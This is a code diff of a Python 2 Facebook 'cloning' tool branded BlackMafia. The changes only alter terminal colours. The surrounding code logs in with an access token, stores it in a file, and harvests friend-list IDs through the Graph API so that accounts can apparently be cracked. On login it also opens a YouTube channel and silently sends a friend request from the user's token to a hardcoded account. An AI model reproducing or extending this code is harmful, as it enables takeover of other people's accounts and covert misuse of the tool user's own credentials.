@@ -175,9 +175,9 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;94mWarning: \033[1;96mDo Not Use Your Personal Account' )
-		jalan(' \033[1;94mWarning: \033[1;96mUse a New Account To Login' )
-		jalan(' \033[1;94mWarning: \033[1;96mTermux  All version Work✅' )                 
+		jalan(' \033[1;93mWarning: \033[1;96mDo Not Use Your Personal Account' )
+		jalan(' \033[1;93mWarning: \033[1;96mUse a New Account To Login' )
+		jalan(' \033[1;93mWarning: \033[1;96mTermux  All version Work✅' )                 
 		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
 		print('	' )
@@ -209,7 +209,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;94mLogin Successful.•◈•..'
+				print '\n\x1b[1;96mLogin Successful.•◈•..'
 				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -254,17 +254,17 @@ def menu():
 		keluar()
 	os.system("clear") #Dev:love_hacker
 	print logo
-	print "  \033[1;97m«----•◈••◈•----\033[1;94mLogged in User Info\033[1;97m----•◈••◈•-----»"
+	print "  \033[1;97m«----•◈••◈•----\033[1;93mLogged in User Info\033[1;97m----•◈••◈•-----»"
 	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;94mStart Cloning..."
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;96mStart Cloning..."
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mlogout            "
 	pilih()
 
 
 def pilih():
-	unikers = raw_input("\n\033[1;94mChoose an Option>>> \033[1;97m")
+	unikers = raw_input("\n\033[1;96mChoose an Option>>> \033[1;97m")
 	if unikers =="":
 		print "\x1b[1;97mFill in correctly"
 		pilih()
@@ -291,20 +291,20 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;94mClone From Friend List."
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;94mClone Friend List Public ID."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;96mClone From Friend List."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;96mClone Friend List Public ID."
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mBack"
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
+	peak = raw_input("\n\033[1;96mChoose an Option>>> \033[1;97m")
 	if peak =="":
 		print "\x1b[1;94mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 		jalan('\033[1;94mGetting IDs \033[1;94m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -314,14 +314,14 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
+			print"\033[1;97mName\033[1;97m:\033[1;96m "+op["name"]
 		except KeyError:
 			print"\x1b[1;97mID Not Found!"
-			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
+			raw_input("\n\033[1;97m[\033[1;93mBack\033[1;97m]")
 			super()
 		print"\033[1;94mGetting IDs\033[1;97m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
@@ -339,10 +339,10 @@ def pilih_super():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m«--•◈••◈•---\x1b[1;94m•◈•Stop Process Press CTRL+Z•◈•\033[1;97m---•◈••◈•-»"
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	jalan(' \033[1;97m.................\033[1;94mCloning Start..\033[1;97m............ ')
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\n\033[1;97m«--•◈••◈•---\x1b[1;93m•◈•Stop Process Press CTRL+Z•◈•\033[1;97m---•◈••◈•-»"
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	jalan(' \033[1;97m.................\033[1;93mCloning Start..\033[1;97m............ ')
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	
 			
 	def main(arg):
